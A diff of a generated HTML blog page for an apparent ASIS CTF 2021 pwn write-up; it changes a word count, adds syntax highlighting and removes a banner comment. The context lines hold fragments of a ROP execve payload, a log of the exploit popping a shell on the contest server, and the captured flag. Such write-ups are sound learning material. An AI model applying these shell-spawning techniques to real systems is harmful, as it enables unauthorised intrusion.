@@ -224,7 +224,7 @@ justpwnit     justpwnit was a warmup pwn challenge. That&rsquo;s only a basic st
         }
     },
     "url" : "https:\/\/nasm.re\/posts\/pwnasis\/",
-    "wordCount" : "2618",
+    "wordCount" : "2612",
     "genre" : [ "ctf" , "ret2school" , "ASIS CTF" , "nasm" , "pwn" , "heap" , "oob write" , "2021" ]
 }
 </script>
@@ -1051,25 +1051,25 @@ So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</cod
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<pre><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
-[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">➜  abbr.d git:<span class="o">(</span>master<span class="o">)</span> ✗ python3 exploit.py <span class="nv">HOST</span><span class="o">=</span>168.119.108.148 <span class="nv">PORT</span><span class="o">=</span><span class="m">10010</span> 
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/pwn/asis2021/abbr.d/abbr&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[+] Opening connection to 168.119.108.148 on port 10010: Done
-/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  res = self.recvuntil(delim, timeout=timeout)
-[*] Switching to interactive mode
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> Opening connection to 168.119.108.148 on port 10010: Done
+/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 $ id
-uid=999(pwn) gid=999(pwn) groups=999(pwn)
+<span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span>
 $ ls
 chall
 flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
 $ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
-ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
-</code></pre><div class="gblog-post__anchorwrap">
+ASIS<span class="o">{</span>d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n<span class="o">}</span>
+</code></pre></div><div class="gblog-post__anchorwrap">
     <h2 id="final-exploit">
         Final exploit
         <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
@@ -1123,10 +1123,6 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
 </span><span class="s1">b* 0x402036
 </span><span class="s1">continue
 </span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
-
-<span class="c1">#===========================================================</span>
-<span class="c1">#                    EXPLOIT GOES HERE</span>
-<span class="c1">#===========================================================</span>
 
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
